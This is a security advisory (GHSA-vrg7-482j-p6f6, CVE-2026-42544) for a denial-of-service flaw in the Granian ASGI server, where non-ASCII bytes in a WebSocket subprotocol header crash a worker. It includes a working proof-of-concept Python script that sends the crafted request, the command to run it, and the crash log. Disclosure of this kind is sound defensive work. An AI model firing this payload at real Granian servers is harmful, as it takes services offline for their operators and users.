# [H] Granian vulnerable to unauthenticated DoS via WebSocket subprotocol header panic

## Summary
Severity: High
Advisory: GHSA-vrg7-482j-p6f6
CVE: CVE-2026-42544
CWE: CWE-20, CWE-248, CWE-400
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-vrg7-482j-p6f6
Type: github-advisory

## Affected
- PyPI: `granian` — affected >=1.2.0 <2.7.4

## Details
### Summary

Granian aborts a worker process when an unauthenticated client sends a WebSocket upgrade request whose `Sec-WebSocket-Protocol` header contains non-ASCII bytes.

The crash happens in Granian's WebSocket scope construction path, before the ASGI application is invoked.

This is a single-request Denial Of Service against one worker. Repeating the request across workers takes the service offline.

### Details

https://github.com/emmett-framework/granian/blob/bdd5b0fbbb2aca6f2f4c0d2700c244d190958035/src/asgi/utils.rs#L122-L125

`HeaderValue::to_str()` returns `Err` for bytes outside visible ASCII. The subsequent `.unwrap()` panics.

In release builds Granian sets `panic = "abort"`, so this panic terminates the worker instead of being handled as a normal request error.


### PoC

#### Step 1.
starts a Granian ASGI server

```python
# app.py
async def app(scope, receive, send):
    if scope["type"] == "websocket":
        await receive()
        await send({"type": "websocket.accept"})
        return

    await send({"type": "http.response.start", "status": 200, "headers": []})
    await send({"type": "http.response.body", "body": b"ok"})
```

```bash
granian --interface asgi app:app --host 127.0.0.1 --port 8000
```

#### Step 2.
sending a raw upgrade request with `Sec-WebSocket-Protocol: \x80\xff` reached this code path and caused the worker to abort.

```python
# ws-subproto-crash.py
import base64, os, socket, sys

host, port, path = sys.argv[1], int(sys.argv[2]), sys.argv[3]
key = base64.b64encode(os.urandom(16)).decode()

req = (
    f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
    "Upgrade: websocket\r\nConnection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
).encode() + b"Sec-WebSocket-Protocol: \x80\xff\r\n\r\n"

with socket.create_connection((host, port), timeout=5) as s:
    s.sendall(req)
    print(s.recv(4096))
```
```bash
python ws-subproto-crash.py 127.0.0.1 8000 /
```


Observed server output:

```
thread '<unnamed>' panicked at src/asgi/utils.rs:125:44:
called `Result::unwrap()` on an `Err` value: ToStrError { _priv: () }
[ERROR] Unexpected exit from worker-1
[INFO] Shutting down granian
```


### Impact

- Unauthenticated remote denial of service
- One crafted request kills one worker
- The application is never reached, so application-level authentication or routing does not mitigate the issue

## References
- https://github.com/emmett-framework/granian/security/advisories/GHSA-vrg7-482j-p6f6
- https://nvd.nist.gov/vuln/detail/CVE-2026-42544
- https://github.com/emmett-framework/granian
